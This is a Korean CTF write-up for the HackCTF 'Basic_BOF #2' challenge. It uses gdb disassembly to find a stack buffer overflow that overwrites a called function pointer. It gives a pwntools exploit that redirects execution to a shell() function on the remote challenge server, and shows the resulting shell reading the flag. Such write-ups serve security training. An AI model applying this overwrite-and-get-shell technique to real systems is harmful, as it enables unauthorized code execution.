# [HackCTF] Basic_BOF #2

bof_basic2를 gdb로 분석해보자.<br>

```c
gef➤  disas main
Dump of assembler code for function main:
   0x080484cd <+0>:	lea    ecx,[esp+0x4]
   0x080484d1 <+4>:	and    esp,0xfffffff0
   0x080484d4 <+7>:	push   DWORD PTR [ecx-0x4]
   0x080484d7 <+10>:	push   ebp
   0x080484d8 <+11>:	mov    ebp,esp
   0x080484da <+13>:	push   ecx
   0x080484db <+14>:	sub    esp,0x94
   0x080484e1 <+20>:	mov    DWORD PTR [ebp-0xc],0x80484b4
   0x080484e8 <+27>:	mov    eax,ds:0x804a040
   0x080484ed <+32>:	sub    esp,0x4
   0x080484f0 <+35>:	push   eax
   0x080484f1 <+36>:	push   0x85
   0x080484f6 <+41>:	lea    eax,[ebp-0x8c]
   0x080484fc <+47>:	push   eax
   0x080484fd <+48>:	call   0x8048350 <fgets@plt>
   0x08048502 <+53>:	add    esp,0x10
   0x08048505 <+56>:	mov    eax,DWORD PTR [ebp-0xc]
   0x08048508 <+59>:	call   eax
   0x0804850a <+61>:	mov    eax,0x0
   0x0804850f <+66>:	mov    ecx,DWORD PTR [ebp-0x4]
   0x08048512 <+69>:	leave  
   0x08048513 <+70>:	lea    esp,[ecx-0x4]
   0x08048516 <+73>:	ret    
End of assembler dump.
```
전체 main문 assembler code는 다음과 같다.<br>
그 중에서 주요한 부분을 보도록 하자.<br>

```c
0x080484f6 <+41>:	lea    eax,[ebp-0x8c]
0x080484fc <+47>:	push   eax
0x080484fd <+48>:	call   0x8048350 <fgets@plt>
0x08048502 <+53>:	add    esp,0x10
0x08048505 <+56>:	mov    eax,DWORD PTR [ebp-0xc]
0x08048508 <+59>:	call   eax
```
위에 main+41에서 보면 eax에 `ebp-0x8c`의 주소값을 담아주고, fgets함수를 call을 하게된다.<br>
main+56에서는  `ebp-0xc`의 주소값을 eax에 넣고 eax의 주소값을 call을 하는 방식이다.<br>

따라서, `ebp-0x8c`부터 `ebp-0xc`의 시작이전 까지 dummy값으로 채워주고, `ebp-0xc`에 특정 함수값을 넣어주면 쉘을 얻을 수 있을것으로 보인다.<br>

```c
gef➤  disas shell
Dump of assembler code for function shell:
   0x0804849b <+0>:	push   ebp
   0x0804849c <+1>:	mov    ebp,esp
   0x0804849e <+3>:	sub    esp,0x8
   0x080484a1 <+6>:	sub    esp,0xc
   0x080484a4 <+9>:	push   0x80485a0
   0x080484a9 <+14>:	call   0x8048370 <system@plt>
   0x080484ae <+19>:	add    esp,0x10
   0x080484b1 <+22>:	nop
   0x080484b2 <+23>:	leave  
   0x080484b3 <+24>:	ret    
End of assembler dump.
```

Shell의 주소는 다음과 같이 확인할수있다.<br>
`ebp-0xc`에 `0x0804849b`의 주소를 넣어주면 해결이 될것같다.<br>

## Exploit Code
```c
from pwn import *
p = remote("ctf.j0n9hyun.xyz",3001)

payload = 'a'*(0x8c-0xc)
payload += p32(0x0804849b)

p.sendline(payload)
p.interactive()
```

```c
kimdong@ubuntu  ~/Wargame  python ex2.py
[+] Opening connection to ctf.j0n9hyun.xyz on port 3001: Done
[*] Switching to interactive mode
$ ls
flag
main
$ cat flag
HackCTF{}
```

## END !
